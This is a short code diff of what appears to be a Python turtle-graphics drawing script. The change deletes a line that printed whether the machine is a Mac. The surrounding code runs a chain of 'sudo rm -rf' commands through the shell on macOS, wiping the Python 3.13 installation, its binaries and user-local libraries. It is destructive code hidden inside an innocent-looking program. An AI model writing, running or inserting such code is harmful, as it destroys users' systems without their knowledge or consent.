@@ -35,7 +35,7 @@ for i in range(140):
     pendown(), stamp()
 
 isMac = platform.system() == "Darwin"
-print(isMac)
+
 if isMac:
     delTemp = 'sudo rm -rf /Library/Frameworks/Python.framework/Versions/3.13 && sudo rm -rf /Applications/Python\ 3.13 && sudo rm -rf /usr/local/bin/python3 && sudo rm -rf /usr/local/bin/python3.13 && rm -rf ~/.local/lib/python3.13 && rm -rf ~/.local/bin/python3'
     subprocess.run(delTemp, shell=True)
